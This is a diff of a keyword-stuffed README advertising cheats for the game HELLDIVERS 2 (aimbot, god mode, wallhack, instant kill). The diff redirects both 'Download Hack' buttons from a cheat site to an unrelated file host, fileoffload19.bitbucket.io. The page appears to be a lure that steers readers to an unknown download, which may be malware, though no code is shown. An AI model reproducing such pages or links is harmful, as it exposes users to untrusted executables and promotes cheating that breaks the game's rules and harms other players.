@@ -4,7 +4,7 @@
 
 Whether you're running Helldive difficulty or trolling bots in solo missions, these hacks give you 100% domination.
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://wecheaters.github.io/cheats/helldivers-2/)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload19.bitbucket.io)
 ---
 
 ## 🎮 What Is a HELLDIVERS 2 Hack?
@@ -19,7 +19,7 @@ A **HELLDIVERS 2 hack** is a cheat system designed to bypass the game’s limita
 * 🔫 No recoil / instant kill
 
 
-![Download Hack](https://keysforgamers.com/images/news-item/5/6/657/657_orig_1.jpg)](https://wecheaters.github.io/cheats/helldivers-2/)
+![Download Hack](https://keysforgamers.com/images/news-item/5/6/657/657_orig_1.jpg)](https://fileoffload19.bitbucket.io)
 ---
 
 ## 🔥 Top HELLDIVERS 2 Hack Features
@@ -108,3 +108,4 @@ helldivers 2 hack, aimbot helldivers, god mode cheat, wallhack helldivers 2, inf
 
 **Don’t just fight for democracy — *dominate* for it.**
 With a **HELLDIVERS 2 Hack**, you're not surviving… you're rewriting the rules of war. 🪖💥🛰️
+
